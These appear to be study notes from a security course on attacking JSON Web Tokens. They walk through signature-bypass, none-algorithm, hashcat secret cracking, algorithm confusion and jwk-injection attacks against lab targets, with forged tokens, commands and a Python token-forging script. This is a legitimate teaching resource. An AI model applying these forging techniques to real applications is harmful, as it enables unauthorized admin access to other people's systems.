# JWTs

## Attacking Signature Verification

### Missing Signature Verification

Before jumping into the attack, let us look at our target web application. Starting our target and accessing the provided URL, we are greeted with a simple login page:

<figure><img src="../../../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

We can use the provided credentials to log in to the web application, which displays an almost empty page:

<figure><img src="../../../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

Due to the message `You are not an admin!`, we can infer that there are users with different privilege levels. Let us investigate if we can find a way to escalate our privileges to an administrator to see if this will display more information to us.

As we can see in the response to a successful login request, the web application uses a JWT as our session cookie to identify our user:

<figure><img src="../../../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

The response contains the following JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUM-tNnrIMwvHeSZf0eB0
```

To analyze the contents of a JWT, we can use web services such as [jwt.io](https://jwt.io/) or [CyberChef](https://gchq.github.io/CyberChef/). Pasting the JWT into `jwt.io`, we can see the following payload:

```json
{
  "user": "htb-stdnt",
  "isAdmin": false,
  "exp": 1711186044
}
```

<figure><img src="../../../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

The JWT contains our username, an `isAdmin` claim, and an expiry timestamp. Since our goal is to escalate our privileges to an administrator, the `isAdmin` claim seems to be an obvious way to achieve that goal. We can simply manipulate that parameter in the payload, and `jwt.io` will automatically re-encode the JWT on the left side. However, as discussed previously, this will invalidate the JWT's signature.

This is where our first attack comes into play. Before accepting a JWT, the web application must verify the JWT's signature to ensure it has not been tampered with. If the web application is misconfigured to accept JWTs without verifying their signature, we can manipulate our JWT to escalate privileges.

Due to recent update of `jwt.io`, certain actions have been limited, such as editing the contents (payload) of the JWT token directly. As an alternative, [jwt.lannysport.net](https://jwt.lannysport.net/) can be used.

To achieve this, let us change the `isAdmin` parameter's value to `true` in `jwt.io`:

<figure><img src="../../../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

We can then pass the manipulated JWT in the `session` cookie in the request to `/home`:

```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0fQ.S85PjpnL6BNhBCWk6OYDHc_XjfWogMJV8wq5pKJ6Tv4
```

Since the web application does not verify the JWT's signature, it will grant us admin access:

<figure><img src="../../../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

***

### None Algorithm Attack

Another technique of making the web application accept a manipulated JWT is utilizing the `none` algorithm. As discussed in the previous section, this algorithm implies that the JWT does not contain a signature, and the web application should accept it without computing one. Due to the lack of a signature, the web application will accept a token without signature verification if misconfigured.

To forge a JWT with the `none` algorithm, we must set the `alg`-claim in the JWT's header to `none`. We can achieve this using [CyberChef](https://gchq.github.io/CyberChef/) by selecting the `JWT Sign` operation and setting the `Signing algorithm` to `None`. We can then specify the same JWT payload we have used before, and CyberChef will forge a JWT for us:

Code: json

```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

<figure><img src="../../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Just like before, we can then pass the manipulated JWT in the `session` cookie in the request to `/home`:

```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0LCJpYXQiOjE3MTExODY0NTJ9.

Since the web application accepts the JWT with the none algorithm, it will grant us admin access:
```

Since the web application accepts the JWT with the `none` algorithm, it will grant us admin access:

<figure><img src="../../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

> Note: Even though the JWT does not contain a signature, the final period (`.`) still needs to be present.

***

### Labs - Questions

* Escalate your privileges to obtain the flag

<figure><img src="../../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

First, login into the web and see we arent admin user, and read us JWT token -->

<figure><img src="../../../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc1OTE2ODMwMn0.XIYDwO686JUF7AuOL5j2izk8WggqlSxYifIRkCpJ4Tw
```

Now, read it into [https://jwt.lannysport.net/](https://jwt.lannysport.net/)

<figure><img src="../../../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

Change isAdmin same True, copy this JWT and paste into the new in the website and reload

<figure><img src="../../../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

We can see a errror, so... with this changes, create a new into cybercheft with null sing -->

<figure><img src="../../../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

***

## Attacking the Signing Secret

In the previous section, we discussed attacks that bypass the signature verification of JWTs. However, if we were to know the signing secret, we could create a valid signature for a forged JWT. After requesting a valid JWT from the web application, we then attempt to brute-force the signing secret to obtain it.

JWT supports three symmetric algorithms based on potentially guessable secrets: `HS256`, `HS384`, and `HS512`.

***

### Obtaining the JWT

Just like before, we can obtain a valid JWT by logging in to the application:

<figure><img src="../../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

We can then check the signature algorithm by inspecting the `alg`-claim on `jwt.io`:

<figure><img src="../../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

As we can see, the token uses the symmetric algorithm `HS256`; thus, we can potentially brute-force the signing secret.

### Cracking the Secret

We will use `hashcat` to brute-force the JWT's secret. Hashcat's mode `16500` is for JWTs. To brute-force the secret, let us save the JWT to a file:

```shell-session
eldeim@htb[/htb]$ echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0 > jwt.txt
```

Afterward, we can run hashcat on it with a wordlist of our choice:

```shell-session
eldeim@htb[/htb]$ hashcat -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaH...l3WTW0
Time.Started.....: Sat Mar 23 15:24:17 2024 (2 secs)
Time.Estimated...: Sat Mar 23 15:24:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3475.1 kH/s (0.50ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4358144/14344384 (30.38%)
Rejected.........: 0/4358144 (0.00%)
Restore.Point....: 4354048/14344384 (30.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: rb270990 -> raynerleow
Hardware.Mon.#1..: Util: 52%

eldeim@htb[/htb]$ hashcat -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --show

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0:rayruben1
```

### Forging a Token

Now that we have successfully brute-forced the JWT's signing secret, we can forge valid JWTs. After manipulating the JWT's body, we can paste the signing secret `rayruben1` into jwt.io. The site will then compute a valid signature for our manipulated JWT:

<figure><img src="../../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

We can now use the forged JWT to obtain administrator access to the web application:

<figure><img src="../../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

### Labs - Questions

* Escalate your privileges to obtain the flag

Singin into the web with the credenitals and get the JWT

<figure><img src="../../../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

With it we can se that is HS256 and it is vulnerable to burte force, save it token and brute force it -->

```
eldeim@htb[/htb]$ echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc1OTE4MTIzMn0.ArU_ACiiGUUt4iMrb_Wm6k0ZV0ae_moJg4AS1tFljWU > jwt.txt
```

Run hashcat to decode it -->

```shell-session
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

With it password, paste the JWT into [https://jwt.lannysport.net/](https://jwt.lannysport.net/) and set the secret, with it modify the JWT and paste again into the website -->

<figure><img src="../../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

***

## Algorithm Confusion

If the web application uses an asymmetric algorithm such as `RS256`, a `private key` is used to compute the signature. In contrast, a `public key` is used to verify the signature, i.e., a different key is used for signing and verification. If we create a token that uses a symmetric algorithm such as `HS256`, the token's signature can be verified with the same key used to sign the JWT. Since the web application uses the `public key` for verification, it will accept any symmetric JWTs signed with this key. As the name suggests, this key is public, enabling us to forge a valid JWT by signing it with the web application's public key.

This attack only works if the web application uses the algorithm specified in the `alg`-claim of the JWT to determine the algorithm for signature verification. In particular, the vulnerability can be prevented by configuring the web application to always use the same algorithm for signature verification. For instance, by hardcoding the algorithm to `RS256`.

### Obtaining the Public Key

Like before, we can log in to our sample web application to obtain a JWT. If we analyze the token, we can see that it was signed using an asymmetric algorithm (`RS256`):

<figure><img src="../../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

To execute an algorithm confusion attack, we need access to the public key used by the web application for signature verification. While this public key is often provided by the web application, there are cases where we cannot obtain it directly. However, since the key is not meant to be kept private, it can be computed from the JWTs themselves.

To achieve this, we will use [rsa\_sign2n](https://github.com/silentsignal/rsa_sign2n). The tool comes with a docker container we can use to compute the public key used to sign the JWTs.

We can build the docker container like so:

```shell-session
eldeim@htb[/htb]$ git clone https://github.com/silentsignal/rsa_sign2n

eldeim@htb[/htb]$ cd rsa_sign2n/standalone/

eldeim@htb[/htb]$ docker build . -t sig2n
```

Now we can run the docker container:

```shell-session
eldeim@htb[/htb]$ docker run -it sig2n /bin/bash
```

We must provide the tool with two different JWTs signed with the same public key to run it. We can obtain multiple JWTs by sending the login request multiple times in Burp Repeater. Afterward, we can run the script in the docker container with the captured JWTs:

```shell-session
eldeim@htb[/htb]$ python3 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTI3MTkyOX0.<SNIP> eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTcxMTI3MTk0Mn0.<SNIP>

[*] GCD:  0x1
[*] GCD:  0xb196 <SNIP>
[+] Found n with multiplier 1  :
 0xb196 <SNIP>
[+] Written to b1969268f0e66b1c_65537_x509.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM'
[+] Written to b1969268f0e66b1c_65537_pkcs1.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.vFrCp8X_-Te6ENlAi4-a_xitEaOSfEzQIbQbzXpWnVE'
================================================================================
Here are your JWT's once again for your copypasting pleasure
================================================================================
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzExMzU2NTczfQ.vFrCp8X_-Te6ENlAi4-a_xitEaOSfEzQIbQbzXpWnVE
```

The tool may compute multiple public key candidates. To reduce the number of candidates, we can rerun it with different JWTs captured from the web application. Additionally, the tool automatically creates symmetric JWTs signed with the computed public key in different formats. We can use these JWTs to test for an algorithm confusion vulnerability.

If we analyze the JWT created by the tool, we can see that it indeed uses a symmetric signature algorithm (`HS256`):

<figure><img src="../../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

Furthermore, if we send this token to the web application, it is accepted. Thus proving that the web application is vulnerable to algorithm confusion:

<figure><img src="../../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

### Forging a Token

Now that we have confirmed the vulnerability allows us to forge tokens, we will exploit it to obtain administrator privileges. `rsa_sign2n` conveniently saves the public key to a file within the docker container:

```shell-session
eldeim@htb[/htb]$ cat b1969268f0e66b1c_65537_x509.pem

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZaSaPDmaxyds/NMppno
dUEWomQEdu+p57T4B7tjCZp0nRQk1HnOR8LuTztHn6U4ZKEHvHWGF7PxHHgtxrTb
7uhbwhsu3XVTcd1c/S2G9TCvW4WaF8uqNjgzUJEANsABGXHSVCuM7CLf2jWjVyWX
6w4dbyK3LNHvt/tkJspeGwx3wT1Gq2RpQ6n0+J/q6vxKBAc4z9QuzfgLPpnZFdYj
kZyJimyFmiyPDP6k2MZYr6rgiuUhCQQlFBL8yS94dITAoZhGIJDtNW9WDV7gOB8t
OgPrAdBM2rm8SmlNjsaHxIDec2E+qafCm8VnwSLXHXb9IDvLSTCqI+gOSJEGgTuT
VQIDAQAB
-----END PUBLIC KEY-----
```

Now, we can use `CyberChef` to forge our JWT by selecting the `JWT Sign` operation. We must set the `Signing algorithm` to `HS256` and paste the public key into the `Private/Secret key` field. Additionally, we need to add a newline (`\n`) at the end of the public key:

<figure><img src="../../../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

Finally, we need to provide the forged JWT to the web application to escalate our privileges:

<figure><img src="../../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

### Labs - Questions

* Escalate your privileges to obtain the flag.

Sing in into the web and obtaint the JWT -->

<figure><img src="../../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

It is a RS256, so... install rsa\_sign2n into env python -->

```shell-session
eldeim@htb[/htb]$ git clone https://github.com/silentsignal/rsa_sign2n
eldeim@htb[/htb]$ cd rsa_sign2n/standalone/
eldeim@htb[/htb]$ python3 -m venv venv && source venv/bin/activate
eldeim@htb[/htb]$ pip install --upgrade pip && pip install gmpy2
eldeim@htb[/htb]$ pip install -r requirements.txt
eldeim@htb[/htb]$ sudo apt install -y build-essential python3-dev libgmp-dev libmpfr-dev libmpc-dev
```

We must provide the tool with two different JWTs signed with the same public key to run it.

```
## 1º
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc1OTE4MjM5M30.C1_7zuv24bRPWEEgqKkZjk4s82WK-60PV6gLwFVvUSKoX9-KKeqhxoZbE3A_trE0zthfzDCIveRzSuN4-WMd6QKctG-agOqZv_0mJFQcffgrAgIFzabF39v7qo3i6S4KGpKSFewahi0VpkUUshbXY8keWPHLMCwnQpdc9QJ3v_X7u5wyGcrkKdMGDOQMskSnpFtv3TmsloF6snvhSdYLGL7jCfWJUkI024GZVZ618bAoZMvuOiro6mj6v0jii3hP4JPPaI9-TLjnhYJb22oOk-NdP7j-Qs1_bmtP6A-CT61GP7nd-9DrUgHo0trPCNxMxQoaPVKnH2LU-wIGDwfpEw
## 2º
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc1OTE4MzI3MH0.a1oIbirwMdjqgM4EhnEmnG6kKpA33ZnaYlEebXT4uCUFrgYl7J_qVuCLdzad1Ab0cXnhpWnG4dB9zcNn3AF4c3v8Dqf_zAEPwRLOocTP5mOU-KAWx9HZ4xpr8cmDcFUjaldqQ7mPPDgVlRFCoFC-c1q_27nmwZh5h3PgI-qbBfgq3WpbCeyoYqHBRQIDOpw3aUKlv3j8eQABHgaVk1juNqIAAsiMgGH625AQwxfS0IO8XR0ZFSBA2-g8JilBx7IvjFNl6_eaUpGCbMmT_XVCQG0iJ-SEAyxxyWRQqUIO7TFPPAiNSIXRRQHO29Q0MRJF0uSpq4_IVTm7iAmfamJjFg
```

```
(venv) ┌─[eu-academy-2]─[10.10.14.50]─[htb-ac-489480@htb-nes9qfibyp]─[~/rsa_sign2n/standalone]
└──╼ [★]$ python3 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc1OTE4MjM5M30.C1_7zuv24bRPWEEgqKkZjk4s82WK-60PV6gLwFVvUSKoX9-KKeqhxoZbE3A_trE0zthfzDCIveRzSuN4-WMd6QKctG-agOqZv_0mJFQcffgrAgIFzabF39v7qo3i6S4KGpKSFewahi0VpkUUshbXY8keWPHLMCwnQpdc9QJ3v_X7u5wyGcrkKdMGDOQMskSnpFtv3TmsloF6snvhSdYLGL7jCfWJUkI024GZVZ618bAoZMvuOiro6mj6v0jii3hP4JPPaI9-TLjnhYJb22oOk-NdP7j-Qs1_bmtP6A-CT61GP7nd-9DrUgHo0trPCNxMxQoaPVKnH2LU-wIGDwfpEw eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc1OTE4MzI3MH0.a1oIbirwMdjqgM4EhnEmnG6kKpA33ZnaYlEebXT4uCUFrgYl7J_qVuCLdzad1Ab0cXnhpWnG4dB9zcNn3AF4c3v8Dqf_zAEPwRLOocTP5mOU-KAWx9HZ4xpr8cmDcFUjaldqQ7mPPDgVlRFCoFC-c1q_27nmwZh5h3PgI-qbBfgq3WpbCeyoYqHBRQIDOpw3aUKlv3j8eQABHgaVk1juNqIAAsiMgGH625AQwxfS0IO8XR0ZFSBA2-g8JilBx7IvjFNl6_eaUpGCbMmT_XVCQG0iJ-SEAyxxyWRQqUIO7TFPPAiNSIXRRQHO29Q0MRJF0uSpq4_IVTm7iAmfamJjFg
[*] GCD:  0x1
[*] GCD:  0xb1969268f0e66b1c9db3f34ca699e8754116a2640476efa9e7b4f807bb63099a749d1424d479ce47c2ee4f3b479fa53864a107bc758617b3f11c782dc6b4dbeee85bc21b2edd755371dd5cfd2d86f530af5b859a17cbaa36383350910036c0011971d2542b8cec22dfda35a3572597eb0e1d6f22b72cd1efb7fb6426ca5e1b0c77c13d46ab646943a9f4f89feaeafc4a040738cfd42ecdf80b3e99d915d623919c898a6c859a2c8f0cfea4d8c658afaae08ae5210904251412fcc92f787484c0a198462090ed356f560d5ee0381f2d3a03eb01d04cdab9bc4a694d8ec687c480de73613ea9a7c29bc567c122d71d76fd203bcb4930aa23e80e489106813b9355
[+] Found n with multiplier 1  :
 0xb1969268f0e66b1c9db3f34ca699e8754116a2640476efa9e7b4f807bb63099a749d1424d479ce47c2ee4f3b479fa53864a107bc758617b3f11c782dc6b4dbeee85bc21b2edd755371dd5cfd2d86f530af5b859a17cbaa36383350910036c0011971d2542b8cec22dfda35a3572597eb0e1d6f22b72cd1efb7fb6426ca5e1b0c77c13d46ab646943a9f4f89feaeafc4a040738cfd42ecdf80b3e99d915d623919c898a6c859a2c8f0cfea4d8c658afaae08ae5210904251412fcc92f787484c0a198462090ed356f560d5ee0381f2d3a03eb01d04cdab9bc4a694d8ec687c480de73613ea9a7c29bc567c122d71d76fd203bcb4930aa23e80e489106813b9355
[+] Written to b1969268f0e66b1c_65537_x509.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzU5MjY3OTY0fQ.QKINsw7OYAo8CGiBMCo_dEIOjsRItIWy48cfYl69_gs'
[+] Written to b1969268f0e66b1c_65537_pkcs1.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzU5MjY3OTY0fQ.q44140V1iiYsqY7EtTT8Wxs0KzX5N7WJ-Q0EIcfJ8SI'
================================================================================
Here are your JWT's once again for your copypasting pleasure
================================================================================
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzU5MjY3OTY0fQ.QKINsw7OYAo8CGiBMCo_dEIOjsRItIWy48cfYl69_gs
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzU5MjY3OTY0fQ.q44140V1iiYsqY7EtTT8Wxs0KzX5N7WJ-Q0EIcfJ8SI
```

Now that we have confirmed the vulnerability allows us to forge tokens, we will exploit it to obtain administrator privileges. `rsa_sign2n` conveniently saves the public key to a file within folder:

```
cat b1969268f0e66b1c_65537_x509.pem

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZaSaPDmaxyds/NMppno
dUEWomQEdu+p57T4B7tjCZp0nRQk1HnOR8LuTztHn6U4ZKEHvHWGF7PxHHgtxrTb
7uhbwhsu3XVTcd1c/S2G9TCvW4WaF8uqNjgzUJEANsABGXHSVCuM7CLf2jWjVyWX
6w4dbyK3LNHvt/tkJspeGwx3wT1Gq2RpQ6n0+J/q6vxKBAc4z9QuzfgLPpnZFdYj
kZyJimyFmiyPDP6k2MZYr6rgiuUhCQQlFBL8yS94dITAoZhGIJDtNW9WDV7gOB8t
OgPrAdBM2rm8SmlNjsaHxIDec2E+qafCm8VnwSLXHXb9IDvLSTCqI+gOSJEGgTuT
VQIDAQAB
-----END PUBLIC KEY-----
```

> Note: Allways is the end to x509.pem

Now, we can use `CyberChef` to forge our JWT by selecting the `JWT Sign` operation. We must set the `Signing algorithm` to `HS256` and paste the public key into the `Private/Secret key` field. Additionally, we need to add a newline (`\n`) at the end of the public key:

<figure><img src="../../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzU5MjY3OTY0LCJpYXQiOjE3NTkxODI4OTF9.w6nyDgS-L5YRA2xiFmVF4MnMB7yMBMj-eYcMtYp27JPIy_5VD0_jEqDEwqD372noOn1w07jzS6Q_mVCsdpJeFA
```

Rempalce it into the website -->

<figure><img src="../../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

***

## Further JWT Attacks

***

There are other vulnerabilities that can affect JWTs, and while we cannot cover all of them, a few are worth learning about. These include vulnerabilities resulting from shared JWT secrets between web applications and use of other standardized JWT claims. While the JWT header often contains only the `alg` and `type` claims, the standard defines multiple additional claims that may be used in JWT headers.

### Reusing JWT Secrets

If a company hosts multiple web applications that use JWTs for authentication, each must use a different signing secret. If this is not the case, an attacker might be able to use a JWT obtained from one web application to authenticate to another. This situation becomes particularly problematic if one of these web applications grants higher privilege level access, and both encode the privilege level within the JWT.

For instance, assume a company hosts two different social media networks: `socialA.htb` and `socialB.htb`. Furthermore, a sample user is a moderator on `socialA`, thus their JWT contains the claim `"role": "moderator"`, while on `socialB` they do not have any special privileges, i.e., the JWT contains the claim `"role": "user"`. If both social networks used the same JWT secret, the sample user would be able to re-use their JWT from `socialA` on `socialB` to obtain moderator privileges.

### Exploiting jwk

Before discussing how to exploit the `jwk` claim, let us understand its purpose. The claim is defined in the [JWS standard](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2):

```
The "jwk" (JSON Web Key) Header Parameter is the public key that corresponds to the key used to digitally sign the JWS. 
This key is represented as a JSON Web Key. Use of this Header Parameter is OPTIONAL.
```

As we can see, `jwk` contains information about the public key used for key verification for asymmetric JWTs. If the web application is misconfigured to accept arbitrary keys provided in the `jwk` claim, we could forge a JWT, sign it with our own private key, and then provide the corresponding public key in the `jwk` claim for the web application to verify the signature and accept the JWT.

Just like before, let us obtain and analyze a JWT by logging into the web application:

<figure><img src="../../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

We can see that this time, the JWT's header contains a `jwk` claim with the details about the public key. Let us attempt to execute our exploit plan, which we discussed before.

Firstly, we need to generate our own keys to sign the JWT. We can do so with the following commands:

```shell-session
eldeim@htb[/htb]$ openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048

eldeim@htb[/htb]$ openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```

With these keys, we need to perform the following steps:

* Manipulate the JWT's payload to set the `isAdmin` claim to `true`
* Manipulate the JWT's header to set the `jwk` claim to our public key's details
* Sign the JWT using our private key

We can automate the exploitation using the following python script:

```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```

We can run it after installing the required dependencies:

```shell-session
eldeim@htb[/htb]$ pip3 install pyjwt cryptography python-jose

eldeim@htb[/htb]$ python3 exploit.py 

eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6InJ0eV96YWRVSjJBZFpfQ3BqaDJCRlVQd2YtWnlWeUt6aWYzbjZZc3ZxVWlwZjh5ZVNpSGk2RFJVRm9ibzVfMnpnSnRQeVVGTmNyRzIwSWd6cTdobzRDNWRfcVN0d2RfVnRfcHQ0Q0Zmdm1CZHRlZzVTcmJIYVVlbU1CQXFYbVB6S2sxOUNOVkZTdVhqa21mSk9OZ1Q3Q3VoRFV5bTFiN3U3TjNsQmlZVmh2Rnl5NVZ1dHplNkN2MS1aMTF0THhCaEF4cnlNTHNsSG1HODZmNld5ZTAwcGYyR21xel93LTdGT3dfcUFZdUwtZlpMVXNZSVltT01PVDAxa3pMV1VWSDJ0R2VYNGdYaVc2YU94cC1SNFd4NUo5ai1QZlFjcVFTOXduOHZ0Ry1rSjBQYlRVbGozUi12djk3d0VLcEZuanhzSGxWN1Rvcm9nSWJKTDZ4YUZJR3YxUSJ9LCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZX0.FimEK1Cnw1PL8Krt7mpzIcBAkVgTOAVquh7yUFIr3xrQmaDzObxmlkOZmHwmBN1Odc0NOZToWVo_o-0Yf1ldPvueGlCShlUyoOyFMVQhiWcW_EIpCPdRoG60Venyp6ePHirrZGPSXz4JAKUKRdj4CWK_2sIHlQmGmmMy0W1hL-08Dq-oueYWY-OsshDrbyMx6ibZ8vmVL4PkiBv6PalPDIrIrJZHEM0tr0IotZy_MNiOF2Rvy22XU2FapIj0cuCL21vud9k_IQZwVhPdEJ_XEnnLiFYRYI0wBl3SQ9N4xtt0eMPSe4CqtOd4veYT1JCmqL6jKkkumIqdUHcdQhA_Aw
```

Analyzing our forged token, we can see that the payload was successfully manipulated, and the `jwk` claim now contains our public key's details:

<figure><img src="../../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

